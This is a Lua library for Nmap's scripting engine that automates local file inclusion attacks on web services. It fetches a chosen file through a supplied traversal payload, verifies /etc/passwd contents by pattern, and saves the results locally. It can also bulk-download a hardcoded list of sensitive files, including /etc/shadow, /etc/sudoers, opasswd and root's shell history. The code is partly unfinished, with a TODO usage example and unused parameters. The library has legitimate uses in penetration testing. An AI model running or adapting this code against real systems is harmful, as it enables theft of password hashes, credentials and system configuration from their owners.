---
-- An exploit library for nmap.
--
-- This module provides NSE scripts with an easy way to write exploits for
-- target services, covering what pwntools does for Python, but tailoring
-- the functionality towards what Nmap is typically used for
--
-- LFI
-- If the option --load-all is provided, the script tries to download
-- interesting files from the target to the directory provided.
--
-- Example usage:
-- <code>
-- TODO
-- </code>
--
-- @copyright Same as Nmap--See https://nmap.org/book/man-legal.html

local stdnse = require "stdnse"
local http = require "http"
local string = require "string"
local io = require "io"

local FILE_SIGNATURES = {
  ['passwd'] = '(.*:.*:.*:.*:.*:.*:.*\n)',
  ['/etc/passwd'] = '(.*:.*:.*:.*:.*:.*:.*\n)',
}

-- TODO Load them later from nselib/data/linux_files.txt
-- Source: https://github.com/lightos/Panoptic/blob/master/cases.xml
local INTERESTING_FILES_LINUX = {
"/etc/hostname",
"/etc/networks",
"/etc/timezone",
"/etc/modules",
"/etc/passwd",
"/etc/passwd~",
"/etc/passwd-",
"/etc/shadow",
"/etc/shadow~",
"/etc/shadow-",
"/etc/fstab",
"/etc/motd",
"/etc/hosts",
"/etc/group",
"/etc/group-",
"/etc/alias",
"/etc/crontab",
"/etc/crypttab",
"/etc/exports",
"/etc/mtab",
"/etc/hosts.allow",
"/etc/hosts.deny",
"/etc/os-release",
"/etc/password.master",
"/etc/profile",
"/etc/default/grub",
"/etc/resolvconf/update-libc.d/sendmail",
"/etc/inittab",
"/etc/issue",
"/etc/issue.net",
"/etc/login.defs",
"/etc/sudoers",
"/etc/sysconfig/network-scripts/ifcfg-eth0",
"/etc/redhat-release",
"/etc/debian_version",
"/etc/fedora-release",
"/etc/mandrake-release",
"/etc/slackware-release",
"/etc/SUSE-release",
"/etc/security/group",
"/etc/security/passwd",
"/etc/security/user",
"/etc/security/environ",
"/etc/security/limits",
"/etc/security/opasswd",
"/boot/grub/grub.cfg",
"/boot/grub/menu.lst",
"/root/.ksh_history",
"/root/.Xauthority",
"/usr/lib/security/mkuser.default",
}

_ENV = stdnse.module("exploit", stdnse.seeall)

---
--Writes string to file
--Taken from: hostmap.nse
-- @param filename Filename to write
-- @param contents Content of file
-- @return True if file was written successfully
function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

--- Gets the most specifc provided script-args
--  Chooses between the script args "exploit.cmd" and "SCRIPT_NAME.cmd"
--  @param   script_name   the caller script name
--  @return  a string with the most specific cmd to run
function get_shell_cmd(script_name)
  local cmd = stdnse.get_script_args(script_name .. '.cmd') or
    stdnse.get_script_args('exploit.cmd')
  return cmd
end

--- Loads common files if the LFI was successful
--  @param host           the target host
--  @param port           the target port
--  @param payload        the payload that triggers the LFI
--  @param directory      the directory to save the accessed files to
--  @param replace_slash  


local function load_all_lfi (host, port, payload, directory, replace_slash, postfix)
  -- TODO leverage on OS detection and limit files loaded
  directory = directory .. '/'
  for _, file in ipairs(INTERESTING_FILES_LINUX) do
    local uri = payload .. file
    local req = http.get(host, port, uri)
    if req.status and req.status == 200 then
      local truncated_file = string.match(file, '.*/(.+)')
      local save_file = directory .. truncated_file
      local status, err = write_file(save_file, req.body)
      if status then
        stdnse.debug1("%s saved to %s\n", file, save_file)
      else
        stdnse.debug1("Error saving %s to %s: %s\n", file, save_file, err)
      end
    end
  end

end

--- Executes a LFI on the target URI
--  @param  host          the remote target ip to attack
--  @param  port          the port to run to attack against
--  @param  payload       the lfi payload
--  @param  filename      the local file name to include
--  @param  outfile       the output file to save to
--  @param  replace_slash character to replace slashes with
--  @param  postfix       postfix for the filepath
--  @return status        the status of the request
--  @return lfi_success   the status of the lfi attack
--  @return contents      the contents of the file
function lfi_check(host, port, payload, filename, outfile, replace_slash, postfix)
  local l_filename = filename or stdnse.get_script_args("exploit.lfi_file") or "/etc/passwd"
  local outfile = outfile or stdnse.get_script_args("exploit.outfile")
  local load_all_dir = stdnse.get_script_args("exploit.load-all")
  local uri = payload .. l_filename

  stdnse.debug1("Getting %s", uri)
  local req = http.get(host, port, uri)
  stdnse.debug1("Status code " .. req.status)

  -- response came back
  if req.status and req.status == 200 then
    -- quit if body is empty, meaning file not included
    if string.len(req.body) <= 0 then
      stdnse.debug1("Response was empty using %s", uri)
      return req.status, false, req.body
    end

    local verifiable, verified = false
    -- if there are signatures try to verify them
    if FILE_SIGNATURES[l_filename] then
      verifiable = true
      if l_filename.match(req.body, FILE_SIGNATURES[l_filename]) then
        verified = true
      end
    end

    if outfile then
      local status, err = write_file(outfile, req.body)
      if status then
        stdnse.debug1("%s saved to %s\n", l_filename, outfile)
      else
        stdnse.debug1("Error saving %s to %s: %s\n", l_filename, outfile, err)
      end
    end

    -- we deem it successful if there are known signatures
    local lfi_success = (verifiable and verified) or (not verifiable and req.status)

    -- we only load more files if the lfi is successful
    if lfi_success and load_all_dir then
      load_all_lfi(host, port, payload, load_all_dir, replace_slash, postfix)
    end

    return req.status, lfi_success, req.body
  else
    return req.status, false, req.body
  end

end

return _ENV
